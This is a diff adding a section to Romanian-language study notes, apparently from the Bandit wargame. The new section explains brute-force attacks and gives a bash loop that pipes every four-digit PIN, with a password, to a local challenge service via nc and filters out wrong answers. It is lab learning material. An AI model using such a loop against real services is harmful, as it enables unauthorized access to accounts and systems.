@@ -101,3 +101,22 @@ Am creat un fișier securizat pentru parole folosind GPG. Algoritmul este atât 
   `alias decripteaza='gpg -d --pinentry-mode loopback'`
 
 - **Regulă de aur:** Dacă uit parola master, pierd tot. Nu există „resetare parolă” la criptare!
+## 12. Brute-force (Atac prin forță brută)
+
+Metodă de a ghici o parolă sau un PIN încercând toate combinațiile posibile. În Bandit nivelul 24, am folosit un script pentru a ghici un PIN de 4 cifre (10.000 de combinații).
+
+**Scriptul folosit (brute.sh):**
+`#!/bin/bash`
+`PAROLA="PAROLA_TA"`
+`for i in {0000..9999}`
+`do`
+`    echo "$PAROLA $i"`
+`done | nc localhost 30002 | grep -v "Wrong"`
+
+**Cum funcționează:**
+- `for i in {0000..9999}` = Buclă care generează toate numerele de la 0000 la 9999.
+- `echo "$PAROLA $i"` = Afișează parola și PIN-ul curent.
+- `| nc localhost 30002` = Trimite textul către serverul de pe portul 30002.
+- `| grep -v "Wrong"` = Filtrează rezultatul, ascunzând răspunsurile greșite (opțiunea `-v` inversează căutarea). Astfel, va apărea doar răspunsul corect.
+
+**Sfat:** Întotdeauna rulați scripturile de brute-force în foldere precum `/tmp`, unde aveți permisiuni de scriere.
